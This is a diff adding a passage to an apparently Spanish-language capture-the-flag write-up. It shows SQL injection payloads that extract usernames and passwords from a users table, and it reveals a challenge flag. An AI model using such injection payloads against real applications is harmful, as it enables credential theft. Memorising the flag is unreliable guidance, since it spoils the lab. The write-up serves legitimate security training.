@@ -178,3 +178,23 @@ Por lo que si seguimos enumerando la base de datos nos encontramos la `tabla use
 ```
 
 ![](/assets/images/writeup-context/admin-sqli-3.PNG)
+
+Ahora si dumpeamos el `campo user` tendremos un usuario. Y si luego hacemos lo mismo con el `campo password` ya tendremos unas `credenciales validas`.
+
+```
+'+(select top 1 username from users order by username)+'
+
+'+(select top 1 password from users order by username)+'
+```
+
+![](/assets/images/writeup-context/admin-sqli-4.PNG)
+
+![](/assets/images/writeup-context/admin-sqli-5.PNG)
+
+Y tambien de la misma forma podemos encontrar una FLAG: `CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}`
+
+```
+'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'
+```
+
+![](/assets/images/writeup-context/admin-sqli-6.PNG)
